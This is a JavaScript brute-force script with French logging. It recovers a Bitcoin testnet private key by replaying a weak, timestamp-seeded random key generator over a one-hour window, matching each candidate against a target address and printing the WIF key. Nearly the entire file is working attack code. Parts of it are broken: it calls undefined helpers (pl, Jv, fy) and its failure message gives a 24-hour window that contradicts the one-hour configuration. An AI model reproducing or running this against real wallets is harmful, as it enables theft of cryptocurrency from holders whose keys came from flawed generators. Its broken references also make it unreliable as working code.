// bruteForceFinal.js

const crypto = require('crypto');
const bitcoin = require('bitcoinjs-lib');

// ----------------------------------------------------------------------
// CONFIGURATION FINALE
// ----------------------------------------------------------------------
const TARGET_ADDRESS = 'mgH6WLmk26RSQWbfDv8ANpgv7RbmPZiiHH';
const SALT_TO_USE = 'test';
const NETWORK = bitcoin.networks.testnet;

const TRANSACTION_TIMESTAMP_MS = 1771490998258;

const SEARCH_WINDOW_HOURS = 1;
const SEARCH_WINDOW_MS = SEARCH_WINDOW_HOURS * 60 * 60 * 1000;

const END_TIMESTAMP_MS = TRANSACTION_TIMESTAMP_MS;
const START_TIMESTAMP_MS = END_TIMESTAMP_MS - SEARCH_WINDOW_MS;

function Wv(f) {
  if (f === void 0) return;
  const cleaned = f.trim().toLowerCase();
  return cleaned.length > 0 ? cleaned : void 0;
}

function bl(buf) {
  return crypto.createHash('sha256').update(crypto.createHash('sha256').update(buf).digest()).digest();
}

function $v(seed) {
  let state = seed >>> 0;
  return () => {
    state = Math.imul(1664525, state) + 1013904223 >>> 0;
    return state / 4294967296;
  };
}

function Pv(seed, func) {
  const originalRandom = Math.random;
  Math.random = $v(seed);
  try {
    return func();
  } finally {
    Math.random = originalRandom;
  }
}

function tp(u, f) {
  const r = Wv(f), c = pl.from(r ? `${u}:${r}` : `${u}`, "utf8"), b = pl.from(bl(c)).readUInt32LE(0), p = pl.alloc(32);
  Pv(b, () => {
    for (let A = 0; A < p.length; A++) p[A] = Math.floor(Math.random() * 256);
  });
  let x = pl.from(bl(p));
  for (let A = 0; A < Jv; A++) x = pl.from(bl(x));
  for (; !fy(x); ) x = pl.from(bl(x));
  return x;
}

function ep(u, f) {
  const privateKeyBytes = tp(u, f);
  const keyPair = bitcoin.ECPair.fromPrivateKey(privateKeyBytes, { network: NETWORK });
  const { address } = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: NETWORK });
  return { address, privateKeyWIF: keyPair.toWIF(), timestamp: u };
}

function runAttack() {
  const totalMilliseconds = END_TIMESTAMP_MS - START_TIMESTAMP_MS;
  console.error(`[ATTAQUE] Démarrage de l'attaque...`);
  console.error(`[ATTAQUE] Cible : ${TARGET_ADDRESS}`);
  console.error(`[ATTAQUE] Salt : "${SALT_TO_USE}"`);
  console.error(`[ATTAQUE] Recherche dans une fenêtre de ${SEARCH_WINDOW_HOURS} heures.`);
  console.error(`[ATTAQUE] Période : du ${new Date(START_TIMESTAMP_MS).toISOString()} au ${new Date(END_TIMESTAMP_MS).toISOString()}`);
  console.error(`[ATTAQUE] Total de ${totalMilliseconds.toLocaleString()} timestamps à tester.`);
  console.error(`[ATTAQUE] Recherche à rebours (du plus récent au plus ancien).\n`);

  for (let ts_ms = END_TIMESTAMP_MS; ts_ms >= START_TIMESTAMP_MS; ts_ms--) {
    
    try {
      const wallet = ep(ts_ms, SALT_TO_USE);
      if (wallet.address === TARGET_ADDRESS) {
        console.log('\nCLÉ TROUVÉE');
        console.log(`--------------------------------------------------`);
        console.log(`Salt utilisé     : "${SALT_TO_USE}"`);
        console.log(`Timestamp (ms)  : ${ts_ms}`);
        console.log(`Date/Heure      : ${new Date(ts_ms).toISOString()}`);
        console.log(`Adresse         : ${wallet.address}`);
        console.log(`Privkey (WIF)   : ${wallet.privateKeyWIF}`);
        console.log(`--------------------------------------------------`);
        console.log('\n>>> MISSION ACCOMPLIE. <<<');
        return;
      }
    } catch (e) {
    }

    if ((END_TIMESTAMP_MS - ts_ms) % 1000 === 0) {
      const progress = ((END_TIMESTAMP_MS - ts_ms) / totalMilliseconds * 100).toFixed(2);
      const barLength = 30;
      const filledLength = Math.round(barLength * progress / 100);
      const bar = '█'.repeat(filledLength) + '░'.repeat(barLength - filledLength);
      process.stdout.write(`\rProgression: [${bar}] ${progress}%`);
    }
  }

  console.error('\n\n[ATTAQUE ÉCHOUÉE] Aucune correspondance trouvée dans la fenêtre de temps.');
  console.error("La clé a peut-être été générée en dehors de cette fenêtre de 24h.");
}

runAttack();